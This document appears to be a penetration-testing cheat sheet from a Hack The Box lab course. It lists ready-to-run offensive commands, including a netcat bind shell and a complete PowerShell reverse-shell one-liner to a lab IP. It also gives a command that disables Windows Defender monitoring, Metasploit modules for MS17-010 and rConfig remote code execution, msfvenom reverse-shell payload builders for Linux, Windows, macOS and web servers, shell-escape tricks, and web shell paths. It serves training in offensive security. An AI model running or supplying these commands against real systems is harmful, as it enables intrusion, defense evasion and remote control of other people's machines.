# Common Exploitation & Shell Commands

## Remote Desktop & Environment Variables
| Command | Description |
|---------|-------------|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol |
| `env` | Discovers system environmental variables, useful for identifying the shell in use |

## Netcat
| Command | Description |
|---------|-------------|
| `sudo nc -lvnp <port #>` | Starts a netcat listener on a specified port |
| `nc -nv <ip address of computer with listener started> <port>` | Connects to a netcat listener at the specified IP address and port |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell to a specified IP and port |

## PowerShell Reverse Shell & Defense Evasion
| Command | Description |
|---------|-------------|
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535` |%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" | PowerShell one-liner reverse shell |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Disables Windows Defender real-time monitoring |

## Metasploit Modules
| Command | Description |
|---------|-------------|
| `use exploit/windows/smb/psexec` | Exploits Windows SMB to gain a shell using PsExec |
| `shell` | Drops into a system shell from a Meterpreter session |
| `use auxiliary/scanner/smb/smb_ms17_010` | Checks if a host is vulnerable to MS17-010 |
| `use exploit/windows/smb/ms17_010_psexec` | Exploits MS17-010 vulnerability to gain a reverse shell |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Exploits rConfig 3.9.6 to gain a reverse shell |

## MSFvenom Payloads
| Command | Description |
|---------|-------------|
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | Creates a Linux ELF reverse shell payload |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe` | Creates a Windows EXE reverse shell payload |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho` | Creates a macOS Mach-O reverse shell payload |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp` | Creates an ASP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp` | Creates a JSP web reverse shell payload |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war` | Creates a WAR Java/JSP web reverse shell payload |

## Interactive Shell Spawning
| Command | Description |
|---------|-------------|
| `python -c 'import pty; pty.spawn("/bin/sh")'` | Uses Python to spawn an interactive shell |
| `/bin/sh -i` | Spawns an interactive shell |
| `perl -e 'exec "/bin/sh";'` | Uses Perl to spawn an interactive shell |
| `ruby: exec "/bin/sh"` | Uses Ruby to spawn an interactive shell |
| `Lua: os.execute('/bin/sh')` | Uses Lua to spawn an interactive shell |
| `awk 'BEGIN {system("/bin/sh")}'` | Uses Awk to spawn an interactive shell |
| `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Uses `find` and `awk` to spawn a shell |
| `find . -exec /bin/sh \; -quit` | Alternative `find` command to spawn a shell |
| `vim -c ':!/bin/sh'` | Uses Vim to spawn an interactive shell (useful for escaping restricted shells) |

## File & Permission Enumeration
| Command | Description |
|---------|-------------|
| `ls -la <path/to/fileorbinary>` | Lists files & directories with permissions |
| `sudo -l` | Displays commands the current user can run as sudo |

## Web Shell Locations (ParrotOS & Pwnbox)
| Command | Description |
|---------|-------------|
| `/usr/share/webshells/laudanum` | Location of Laudanum web shells |
| `/usr/share/nishang/Antak-WebShell` | Location of Antak WebShell |
